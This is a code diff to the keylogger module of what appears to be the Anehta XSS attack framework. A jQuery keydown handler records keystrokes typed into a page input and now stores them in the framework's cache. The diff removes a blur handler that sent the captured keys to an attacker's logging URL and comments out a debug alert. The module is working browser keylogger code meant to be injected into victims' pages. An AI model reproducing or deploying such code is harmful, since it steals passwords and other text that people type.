@@ -27,17 +27,18 @@ $(tagName[0]).keydown(function(event){
 	               "', key:'"+String.fromCharCode(event.keyCode)+
 	               "', keyCode:'"+event.keyCode+
 	               "'}";  
-	keystrokes = keystrokes + String.fromCharCode(event.keyCode);                          
-	alert(keystrokes);
+	
+	keystrokes = keystrokes + String.fromCharCode(event.keyCode);  
+	anehtaCache.appendItem("KeyStrokes", keystrokes);                        
+	//alert(keystrokes);
 	i=i+1;
 	j=j+1
 });
 
 // input失去焦点时触发
 $(tagName[0]).blur(function(){
-	                   keylogger = NoCryptMark + XssInfo_S+"Keylogger: " + keylogger + XssInfo_E;
-	                   anehta.net.getURL(logurl+escape(keylogger));
-	                   anehta.core.freeze(200);
+	                   //anehta.logger.logInfo(keylogger);
+	                   //anehta.core.freeze(200);
 	                 }
 );
 
